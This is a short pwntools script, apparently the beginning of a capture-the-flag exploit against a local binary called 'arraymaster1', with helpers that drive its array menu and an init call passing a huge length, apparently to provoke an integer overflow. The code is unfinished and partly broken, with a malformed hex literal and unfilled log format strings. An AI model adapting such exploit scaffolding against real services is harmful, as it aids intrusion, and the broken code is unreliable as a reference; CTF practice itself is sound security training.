from pwn import *

p=process('./arraymaster1')
e=ELF('./arraymaster1')
#pause()

def list_info(p):
    p.recvuntil('\n> ')
    p.sendline('list')
    log.info('[LISTING]')

def init(p,a,b,c):
    p.recvuntil('\n> ')
    p.sendline('init {} {} {}'.format(a,b,c))
    log.info('[INIT ARR] <{}>'.format(a))
    log.info(p.recvline())
def delete(p,a):
    p.recvuntil('\n> ')
    p.sendline('delete {}'.format(a))
    log.info('[DELETE ARR] <{}>'.format(a))


def set(p,a,b,c):
    p.recvuntil('\n> ')
    p.sendline('set {} {} {}'.format(a,b,c))
    log.info('[SET VALUE] ARR<{}> index<{}> val<{}>')

def get(p,a,b):
    p.recvuntil('\n> ')
    p.sendline('get {} {}'.format(a,b))
    log.info('[GET DATA] ARR<{}> index<{}>')
    return p.recvline()

def quit(p):
    p.recvuntil('\n> ')
    p.sendline('quit')
init(p,'A',64,0xffffffdis)
list_info(p)

p.interactive()
             



